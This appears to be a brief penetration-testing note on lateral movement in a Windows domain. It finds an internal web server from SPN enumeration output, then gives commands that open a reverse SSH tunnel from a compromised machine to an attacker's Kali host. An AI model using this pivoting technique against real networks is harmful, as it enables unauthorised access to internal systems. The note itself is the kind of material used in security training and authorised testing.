> When we look for SPNs using PowerView we may get an output like this:

```
jared      {http/web.staging.com:8080
```

This indicates an internal webserver that is running and we can try to access this for lateral movement. We can use nslookup to gain the IP Address of that machine using the hostname. If we are on a compromised machine which is in the same domain we can do SSH forwarding in order to access it.

> On kali:

```
sudo systemctl start ssh

sudo systemctl status ssh
```

> On compromised machine:

```
ssh -N -R <port>:<spn_ip>:<port> kali@192.168.x.x
```
